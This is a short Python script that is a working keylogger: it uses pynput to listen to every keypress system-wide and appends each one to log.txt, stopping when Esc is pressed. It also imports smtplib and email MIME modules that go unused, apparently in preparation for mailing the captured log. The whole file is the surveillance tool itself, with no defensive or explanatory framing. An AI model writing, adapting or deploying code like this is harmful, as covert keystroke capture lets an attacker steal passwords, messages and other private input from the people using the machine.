from pynput.keyboard import Key,Listener
import logging
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders

def on_press(key):
    key_str = str(key).replace("'","")
    with open('log.txt','a') as f:
        if key_str == 'Key.space':
            f.write(" ")
        elif len(key_str) > 1:
            f.write('\n' + key_str  + '\n')
        else:f.write(key_str)

def stop(key):
    if key == Key.esc:
        exit(0)

with Listener(on_press = on_press,on_release=stop) as listener:
    listener.join()